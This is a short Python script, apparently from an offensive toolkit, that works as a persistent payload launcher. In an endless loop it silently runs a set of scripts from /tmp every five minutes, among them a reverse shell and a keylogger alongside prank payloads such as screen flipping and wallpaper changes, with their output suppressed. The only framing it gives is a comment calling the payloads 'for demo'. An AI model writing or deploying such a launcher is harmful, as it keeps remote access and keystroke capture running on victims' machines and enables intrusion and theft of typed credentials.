#!/usr/bin/env python3
# Route: modules/attacks/payload_launcher.py
# Persistent Python payload execution launcher with visual/funny payloads for demo

import subprocess
import time
import os
import logging

logging.basicConfig(
    filename="/tmp/payload_launcher.log",
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s]: %(message)s",
)

PAYLOAD_SCRIPTS = [
    "/tmp/reverse_shell.py",
    "/tmp/keylogger.py",
    "/tmp/speak_payload.py",
    "/tmp/flip_screen.py",
    "/tmp/change_wallpaper.py",
    "/tmp/browser_pop.py",
]

EXECUTION_INTERVAL = 300  # 5 minutes

def is_script_present(script_path):
    return os.path.isfile(script_path) and os.access(script_path, os.X_OK)

def execute_payload(script_path):
    try:
        logging.info(f"Executing payload: {script_path}")
        subprocess.Popen(["python3", script_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        logging.error(f"Failed to execute {script_path}: {e}")

def main():
    logging.info("Payload launcher started.")
    while True:
        for script in PAYLOAD_SCRIPTS:
            if is_script_present(script):
                execute_payload(script)
            else:
                logging.warning(f"Missing or non-executable: {script}")
        time.sleep(EXECUTION_INTERVAL)

if __name__ == "__main__":
    main()
